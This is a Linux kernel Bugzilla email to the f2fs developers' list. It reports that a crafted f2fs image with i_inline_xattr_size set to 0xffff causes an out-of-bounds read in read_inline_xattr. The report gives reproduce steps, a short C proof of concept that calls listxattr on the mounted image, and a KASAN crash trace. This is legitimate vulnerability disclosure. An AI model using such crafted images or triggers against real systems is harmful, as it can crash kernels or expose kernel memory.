From: bugzilla-daemon@bugzilla.kernel.org
Subject: [Bug 202709] New: Crafted image causes buffer overflow
 in read_inline_xattr
Date: Thu, 28 Feb 2019 18:20:33 +0000
Message-ID: <bug-202709-202145@https.bugzilla.kernel.org/>
Mime-Version: 1.0
Content-Type: text/plain; charset="us-ascii"
Content-Transfer-Encoding: 7bit
Return-path: <linux-f2fs-devel-bounces@lists.sourceforge.net>
Received: from [172.30.20.202] (helo=mx.sourceforge.net)
 by sfs-ml-1.v29.lw.sourceforge.com with esmtps
 (TLSv1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.90_1)
 (envelope-from <bugzilla-daemon@bugzilla.kernel.org>)
 id 1gzQIU-0000dR-5l
 for linux-f2fs-devel@lists.sourceforge.net; Thu, 28 Feb 2019 18:20:42 +0000
Received: from mail.wl.linuxfoundation.org ([198.145.29.98])
 by sfi-mx-4.v28.lw.sourceforge.com with esmtps
 (TLSv1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.90_1)
 id 1gzQIS-004WXI-53
 for linux-f2fs-devel@lists.sourceforge.net; Thu, 28 Feb 2019 18:20:42 +0000
Received: from mail.wl.linuxfoundation.org (localhost [127.0.0.1])
 by mail.wl.linuxfoundation.org (Postfix) with ESMTP id 74EEB2F598
 for <linux-f2fs-devel@lists.sourceforge.net>;
 Thu, 28 Feb 2019 18:20:34 +0000 (UTC)
List-Id: <linux-f2fs-devel.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/linux-f2fs-devel>,
 <mailto:linux-f2fs-devel-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=linux-f2fs-devel>
List-Post: <mailto:linux-f2fs-devel@lists.sourceforge.net>
List-Help: <mailto:linux-f2fs-devel-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/linux-f2fs-devel>,
 <mailto:linux-f2fs-devel-request@lists.sourceforge.net?subject=subscribe>
Errors-To: linux-f2fs-devel-bounces@lists.sourceforge.net
To: linux-f2fs-devel@lists.sourceforge.net

https://bugzilla.kernel.org/show_bug.cgi?id=202709

            Bug ID: 202709
           Summary: Crafted image causes buffer overflow in
                    read_inline_xattr
           Product: File System
           Version: 2.5
    Kernel Version: 4.20
          Hardware: All
                OS: Linux
              Tree: Mainline
            Status: NEW
          Severity: normal
          Priority: P1
         Component: f2fs
          Assignee: filesystem_f2fs@kernel-bugs.kernel.org
          Reporter: bandha890@gmail.com
        Regression: No

Created attachment 281429
  --> https://bugzilla.kernel.org/attachment.cgi?id=281429&action=edit
Compressed img

When I run the poc on the mounted f2fs img I get a buffer overflow in
read_inline_xattr due to there being no sanity check on the value of
i_inline_xattr_size. 

I created the img by just modifying the value of i_inline_xattr_size in the
inode:

i_name                                  [test1.txt]
i_ext: fofs:0 blkaddr:0 len:0
i_extra_isize                           [0x      18 : 24]
i_inline_xattr_size                     [0x    ffff : 65535]
i_addr[ofs]                             [0x       0 : 0]



###REPRODUCE###
mkdir /mnt/f2fs
mount ./f2fs1.img /mnt/f2fs
gcc poc.c -o poc
./poc

###POC###

#include <unistd.h>
#include <sys/syscall.h>
#include <stdio.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <errno.h>
#include <stdlib.h>

int main() {
        int y = syscall(SYS_listxattr, "/mnt/f2fs/test1.txt", NULL, 0);
        printf("ret %d", y);
        printf("errno: %d\n", errno);

}

[79047.934227]
==================================================================
[79047.934261] BUG: KASAN: slab-out-of-bounds in read_inline_xattr+0x18f/0x260
[79047.934265] Read of size 262140 at addr ffff88011035efd8 by task
f2fs1poc/3263

[79047.934273] CPU: 0 PID: 3263 Comm: f2fs1poc Not tainted 4.18.0-custom #1
[79047.934275] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS
rel-1.11.1-0-g0551a4be2c-prebuilt.qemu-project.org 04/01/2014
[79047.934276] Call Trace:
[79047.934289]  dump_stack+0x71/0xab
[79047.934292]  ? read_inline_xattr+0x18f/0x260
[79047.934301]  print_address_description+0x83/0x250
[79047.934304]  ? read_inline_xattr+0x18f/0x260
[79047.934307]  kasan_report+0x213/0x350
[79047.934311]  memcpy+0x1f/0x50
[79047.934314]  read_inline_xattr+0x18f/0x260
[79047.934318]  ? kmalloc_order_trace+0x18/0x90
[79047.934321]  read_all_xattrs+0xba/0x190
[79047.934324]  ? _cond_resched+0x58/0x60
[79047.934327]  f2fs_listxattr+0x9d/0x3f0
[79047.934331]  ? f2fs_xattr_generic_get+0x200/0x200
[79047.934334]  ? kmem_cache_alloc+0xed/0x170
[79047.934337]  ? security_inode_listxattr+0x99/0xd0
[79047.934340]  ? vfs_listxattr+0x41/0x120
[79047.934343]  listxattr+0xb2/0xd0
[79047.934346]  path_listxattr+0x93/0xe0
[79047.934349]  ? listxattr+0xd0/0xd0
[79047.934356]  ? task_work_run+0xd5/0x180
[79047.934363]  ? mm_fault_error+0x270/0x270
[79047.934367]  do_syscall_64+0x9d/0x220
[79047.934371]  ? async_page_fault+0x8/0x30
[79047.934374]  entry_SYSCALL_64_after_hwframe+0x44/0xa9
[79047.934377] RIP: 0033:0x7f391d0d7839
[79047.934390] Code: 00 f3 c3 66 2e 0f 1f 84 00 00 00 00 00 0f 1f 40 00 48 89
f8 48 89 f7 48 89 d6 48 89 ca 4d 89 c2 4d 89 c8 4c 8b 4c 24 08 0f 05 <48> 3d 01
f0 ff ff 73 01 c3 48 8b 0d 1f f6 2c 00 f7 d8 64 89 01 48
[79047.934392] RSP: 002b:00007ffdcf4e8818 EFLAGS: 00000202 ORIG_RAX:
00000000000000c2
[79047.934395] RAX: ffffffffffffffda RBX: 0000000000000000 RCX:
00007f391d0d7839
[79047.934396] RDX: 0000000000000000 RSI: 0000000000000000 RDI:
00005593357337c4
[79047.934398] RBP: 00007ffdcf4e8830 R08: 00007f391d3a8d80 R09:
00007ffdcf4e8910
[79047.934399] R10: 00007f391d3a8d80 R11: 0000000000000202 R12:
00005593357335d0
[79047.934400] R13: 00007ffdcf4e8910 R14: 0000000000000000 R15:
0000000000000000

[79047.934408] Allocated by task 1428:
[79047.934413]  kasan_kmalloc+0xa9/0xc0
[79047.934415]  kmem_cache_alloc+0xed/0x170
[79047.934420]  __kernfs_new_node+0xb1/0x4d0
[79047.934422]  kernfs_new_node+0xba/0x100
[79047.934424]  kernfs_create_link+0xdd/0x1d0
[79047.934427]  sysfs_do_create_link_sd.isra.2+0xdc/0x120
[79047.934432]  device_add+0x709/0x1160
[79047.934434]  device_create_groups_vargs+0x1ad/0x1e0
[79047.934435]  device_create+0x8e/0xc0
[79047.934440]  vc_allocate+0x3ce/0x460
[79047.934442]  con_install+0x49/0x390
[79047.934444]  tty_init_dev+0xca/0x390
[79047.934446]  tty_open+0x807/0x8b0
[79047.934449]  chrdev_open+0x3cd/0x410
[79047.934451]  do_dentry_open+0x71c/0xc00
[79047.934453]  path_openat+0x2c06/0x3580
[79047.934454]  do_filp_open+0x1ad/0x240
[79047.934456]  do_sys_open+0x1c4/0x310
[79047.934458]  do_syscall_64+0x9d/0x220
[79047.934460]  entry_SYSCALL_64_after_hwframe+0x44/0xa9

[79047.934463] Freed by task 0:
[79047.934465] (stack is not available)

[79047.934469] The buggy address belongs to the object at ffff88011035ef00
                which belongs to the cache kernfs_node_cache of size 128
[79047.934473] The buggy address is located 88 bytes to the right of
                128-byte region [ffff88011035ef00, ffff88011035ef80)
[79047.934476] The buggy address belongs to the page:
[79047.934479] page:ffffea000440d780 count:1 mapcount:0
mapping:ffff880107cc6dc0 index:0x0
[79047.934483] flags: 0x200000000000100(slab)
[79047.934488] raw: 0200000000000100 dead000000000100 dead000000000200
ffff880107cc6dc0
[79047.934492] raw: 0000000000000000 0000000000150015 00000001ffffffff
0000000000000000
[79047.934494] page dumped because: kasan: bad access detected

[79047.934497] Memory state around the buggy address:
[79047.934500]  ffff88011035ee80: 00 00 00 00 00 00 00 00 fc fc fc fc fc fc fc
fc
[79047.934503]  ffff88011035ef00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00
[79047.934505] >ffff88011035ef80: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
fc
[79047.934507]                                                     ^
[79047.934510]  ffff88011035f000: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00
[79047.934513]  ffff88011035f080: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00
[79047.934514]
==================================================================
[79047.934516] Disabling lock debugging due to kernel taint

-- 
You are receiving this mail because:
You are watching the assignee of the bug.
